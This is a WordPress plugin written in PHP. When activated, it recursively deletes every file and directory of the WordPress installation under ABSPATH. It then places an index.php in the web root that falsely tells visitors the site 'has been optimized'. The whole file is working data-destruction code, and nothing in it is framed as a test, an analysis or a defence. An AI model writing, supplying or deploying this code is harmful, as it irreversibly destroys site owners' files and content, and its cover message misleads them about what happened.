<?php
/*
Plugin Name: The Last WP Plugin
Description: A plugin to remove the entire WordPress installation and replace it with an optimized message.
Version: 1.0
Author: Doesn't Matter
*/

register_activation_hook(__FILE__, 'remove_wordpress');

function remove_wordpress() {
    // Define the path to the WordPress root directory
    $wp_root = ABSPATH;

    // Function to recursively delete directories and files
    function delete_directory($dir) {
        if (!file_exists($dir)) {
            return;
        }
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                delete_directory($path);
            } else {
                unlink($path);
            }
        }
        rmdir($dir);
    }

    // Delete the WordPress installation
    delete_directory($wp_root);

    // Define the web root path
    $web_root = dirname($wp_root);

    // Create a new index.php in the web root
    $index_content = <<<EOT
<!DOCTYPE html>
<html>
<head>
    <title>Website Optimized</title>
</head>
<body>
    <h1>This website has been optimized</h1>
</body>
</html>
EOT;

    // Write the content to index.php
    file_put_contents($web_root . '/index.php', $index_content);
}
